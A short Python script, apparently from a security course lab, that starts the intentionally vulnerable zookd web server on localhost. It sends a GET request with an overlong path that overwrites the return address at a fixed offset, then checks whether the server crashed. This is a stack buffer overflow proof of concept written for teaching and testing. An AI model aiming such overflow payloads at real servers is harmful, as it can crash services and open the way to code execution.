import socket, struct, time, os, subprocess

RET_OFFSET = 0x814

def crash_test():
    os.system("killall zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    subprocess.Popen(["./clean-env.sh", "./zookld", "zook-exstack.conf"],
                     stdout=open("/dev/null", "w"), stderr=subprocess.STDOUT)
    time.sleep(1)
    path = "/" + "A" * 100
    pad = RET_OFFSET - len(path)
    payload = path + "A" * pad + struct.pack("<I", 0x41414141)
    req = "GET " + payload + " HTTP/1.0\r\n\r\n"
    s = socket.socket()
    s.connect(("localhost", 8080))
    s.send(req)
    s.close()
    time.sleep(0.5)
    alive = os.popen("pgrep zookd-exstack").read().strip()
    os.system("killall zookld zookd-exstack zookfs-exstack 2>/dev/null || true")
    print("RET_OFFSET", RET_OFFSET)
    print("zookd crashed:", not bool(alive))

if __name__ == "__main__":
    crash_test()
